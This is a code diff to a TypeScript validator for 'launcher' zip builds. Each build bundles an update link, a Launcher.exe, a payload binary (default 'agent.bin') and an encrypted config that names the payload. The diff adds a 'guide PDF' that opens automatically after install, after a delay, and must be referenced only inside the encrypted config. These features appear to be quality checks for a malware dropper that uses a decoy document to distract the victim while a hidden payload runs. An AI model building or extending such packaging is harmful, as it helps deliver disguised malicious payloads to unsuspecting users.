@@ -32,6 +32,10 @@ export interface ValidateLauncherParams {
     launcherName?: string;
     payloadName?: string;
   };
+  /* Attached guide PDF (post-install auto-open): when set, the zip MUST carry
+   * it inside the launcher subfolder AND the encrypted config MUST reference
+   * it (`pdf=` + `pdfDelay=`), or the build fails. */
+  pdf?: { name: string; delaySec?: number };
 }
 
 export interface ValidateLauncherResult {
@@ -153,6 +157,7 @@ export async function validateLauncherBuild(
   const launcherName = (p.names?.launcherName ?? "").trim() || "Launcher.exe";
   const payloadName = (p.names?.payloadName ?? "").trim() || "agent.bin";
   const wantNames = [updateLinkName, `${innerFolder}/${launcherName}`, `${innerFolder}/${payloadName}`];
+  if (p.pdf?.name) wantNames.push(`${innerFolder}/${p.pdf.name}`);
   if (entries.count === wantNames.length) {
     pass("zip entry count", `exactly ${wantNames.length} entries (${entries.names.join(", ")})`);
   } else {
@@ -269,6 +274,21 @@ export async function validateLauncherBuild(
       pass("encrypted config carries payload file name", `ciphertext-only (${payloadName})`);
     } else {
       fail("encrypted config carries payload file name", "field missing after decrypt");
+    }
+    if (p.pdf?.name) {
+      const encPdf = encodeURIComponent(p.pdf.name);
+      if (dec.config.includes(`pdf=${encPdf}`)) {
+        pass("encrypted config carries attached PDF", `ciphertext-only (${p.pdf.name})`);
+      } else {
+        fail("encrypted config carries attached PDF", "field missing after decrypt");
+      }
+      const delay = p.pdf.delaySec ?? 0;
+      const encDelay = encodeURIComponent(String(delay));
+      if (dec.config.includes(`pdfDelay=${encDelay}`)) {
+        pass("encrypted config carries PDF open delay", `ciphertext-only (${delay}s)`);
+      } else {
+        fail("encrypted config carries PDF open delay", "field missing after decrypt");
+      }
     }
   } catch (err) {
     const message = err instanceof Error ? err.message : String(err);
